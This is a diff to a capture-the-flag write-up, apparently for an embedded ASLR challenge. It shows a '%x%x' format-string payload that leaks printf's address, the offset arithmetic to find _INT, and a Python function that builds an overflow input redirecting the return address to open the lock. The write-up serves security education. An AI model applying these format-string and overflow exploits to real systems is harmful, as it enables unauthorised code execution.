@@ -546,31 +546,57 @@ The following code snippet contains the functions relevant to the exercise while
 
 We will put together what we know and pay attention to ⚠️:
 * In the password input we can overwrite the return address to `aslr_main`
-     * Bytes 0x8-0x9 of the password will be the address for `INT'
-     * Bytes 0xc-0xd of the password will be the value 0x007f to open the door.
-* But because of ASLR we don't know the current address of `_INT`.
+     * password[0x8] & password[0x9] will be the address for `INT'
+     * password[0xc] & password[0xd] will be the value 0x007f to open the door.
+* But because of ASLR, we don't know the current address of `_INT`.
 * So we will notice that looking at the stack, just before the call to `printf` for the username:
-     * The address of printf itself is 2 bytes from the top of the stack just before reading
-     * We can exploit the weakness of 'printf' as in previous challenges and print to the user the address of 'printf' using the string `%x%x`
-* When we have in hand the address of 'printf' we can easily calculate the address of `_INT`
-     * Because the original functions are copied to memory in the same order.
+     * the address of `printf` sits 2 bytes from the top of the stack just before calling it.
+     * we can exploit the weakness of `printf` as in previous challenges and print to the user the address of `printf` using the string `%x%x`
+* When we have in hand the address of `printf` we can easily calculate the address of `_INT`
+     * because the original functions are copied to memory in the same order.
+
+**Summary of the hacking process:**
+* Insert the string '%x%x' as username:
+
+    ```python
+    b'%x%x'.hex()
+    ```
+* Extract the address of `printf` from the output.
+* Calc the `_INT` address by the original distance between them
+    ```python
+    original__INT = 0x48ec
+    original_printf = 0x476a
+    curr_printf = # complete this part according to the previous step  
+    print("address of _INT:", hex(curr_printf + (original__INT - original_printf)))
+    ```
+* so if `curr_INT` is a var that contains the address of `_INT` as hexadecimal (according to little endian and without '0x'),
+so this will be the second input that cracks this challnge:
+    ```python
+    '00' * 0x8 + curr__INT + '0000' + '7f00'
+    ```
+
+**Illustration:**
+
 
 ## The cracking input (as bytes)
 ```
 25782578
 ```
-taking the `printf` address (remember the little endian) and run this python code for the second input.
+Extract the `printf` address after the first input, and run this python code to generate the second input:
 
 ```python
-def calc_second_input(curr_printf):
-    original__INT = 0x483c
+def generate_malicious_input(curr_printf):
+    original__INT = 0x48ec
     original_printf = 0x476a
     curr__INT = curr_printf + (original__INT - original_printf)
  
-    # little endian...
-    curr__INT = hex(curr__INT)[4:] + hex(curr__INT)[2:4]
+    # remove the '0x'
+    curr__INT = hex(curr__INT)[2:]
+
+    # remember the little endian...
+    curr__INT = curr__INT[2:] + curr__INT[:2]
  
     return '00' * 0x8 + ' ' + curr__INT + ' 0000 7f00'
 
-calc_second_input(int(input("\nEnter printf address: (0x____)\n"), 16))
+generate_malicious_input(int(input("\nEnter printf address: (0x____)\n"), 16))
 ```
